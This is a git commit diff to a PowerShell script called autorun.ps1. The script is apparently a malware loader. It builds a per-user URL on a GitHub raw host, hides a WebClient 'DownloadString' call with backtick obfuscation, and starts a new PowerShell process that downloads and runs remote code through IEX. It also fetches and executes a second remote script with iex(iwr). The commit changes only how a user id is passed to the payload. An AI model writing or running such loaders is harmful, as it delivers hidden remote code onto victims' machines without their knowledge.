2602740fa08d2a9e81ba1eee44041b31df842165
43a1723 <hai1723notgay@gmail.com>
2024-07-01 16:28:53 +0700

    Update autorun.ps1

--- Extras/autorun.ps1
+++ Extras/autorun.ps1
@@ -1,4 +1,4 @@
 $codeuser = ("https://raw.githubusercontent.com/43a1723/test/main/usertelegram/$userid/main.ps1")
 $downloaduser = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$codeuser')"
-Start-Process "powershell" -Argument "IEX($downloaduser)"
+Start-Process "powershell" -Argument "`$userid=$userid;IEX($downloaduser)"
 iex (iwr -uri "https://raw.githubusercontent.com/43a1723/test/main/Extras/download.ps1" -useb)
